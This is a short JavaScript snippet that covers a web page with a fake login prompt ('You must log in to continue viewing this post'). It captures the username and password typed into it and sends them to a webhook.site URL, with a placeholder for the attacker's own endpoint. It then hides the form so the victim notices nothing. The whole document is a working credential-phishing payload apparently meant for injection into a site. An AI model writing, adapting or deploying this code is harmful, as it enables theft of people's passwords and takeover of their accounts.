const overlay = document.createElement('div');
overlay.style.position = 'fixed';
overlay.style.top = '0';
overlay.style.left = '0';
overlay.style.width = '100%';
overlay.style.height = '100%';
overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.5)'; // Semi-transparent black
overlay.style.zIndex = '999';

document.body.appendChild(overlay);

// Create the form element
const form = document.createElement('div');
form.style.position = 'fixed';
form.style.top = '50%';
form.style.left = '50%';
form.style.transform = 'translate(-50%, -50%)';
form.style.padding = '20px';
form.style.backgroundColor = '#fff';
form.style.boxShadow = '0 4px 8px rgba(0,0,0,0.1)';
form.style.zIndex = '1000';

form.innerHTML = `
<h5 style="margin-bottom: 15px;">Oops! You must log in to continue viewing this post:</h5>
<div style="margin-bottom: 10px;">
    <label for="username" style="display:block;">Username</label>
    <input type="text" id="username" style="width: 100%; padding: 5px;" required>
</div>
<div style="margin-bottom: 10px;">
    <label for="password" style="display:block;">Password</label>
    <input type="password" id="password" style="width: 100%; padding: 5px;" required>
</div>
<button id="submitBtn" style="padding: 10px 15px; background-color: #007bff; color: #fff; border: none; cursor: pointer;">Log In</button>
`;

document.body.appendChild(form);

// Handle the form submission
document.getElementById('submitBtn').onclick = function() {
const username = document.getElementById('username').value;
const password = document.getElementById('password').value;

if (!username || !password) {
    alert('Please enter both username and password.');
    return;
}

// Send the GET request
const webhook_url = 'https://webhook.site/00000000000000';//put the webhook url here
const url = `${webhook_url}?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
fetch(url, { method: 'GET' });

// Remove the form and overlay immediately after submission
form.remove();
overlay.remove();
};
